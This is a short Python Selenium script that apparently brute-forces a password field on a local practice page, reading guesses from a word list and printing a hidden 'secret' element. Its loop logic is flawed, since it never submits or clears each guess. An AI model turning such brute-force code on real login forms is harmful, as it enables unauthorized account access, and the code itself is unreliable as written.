import time
from selenium import webdriver
from selenium.webdriver.common.keys import Keys

driver=webdriver.Chrome(r"C:\Users\hunter\Desktop\brute-form\bf\chromedriver")
driver.get("http://localhost/brute/index.html")
file=open('secpas.txt','r')
pas=file.readline()
print(pas)
k=0
while pas:
    try:       
        elem=driver.find_element_by_name("pwd")
        elem.send_keys(pas)
        pas=file.readline()
    except:
        k=1
        file.close()
if k==1:
    but = driver.find_element_by_name("sub").click()
    conf = driver.find_element_by_name("secret").text
    print(conf)
else:
    print("there`s no correct password")
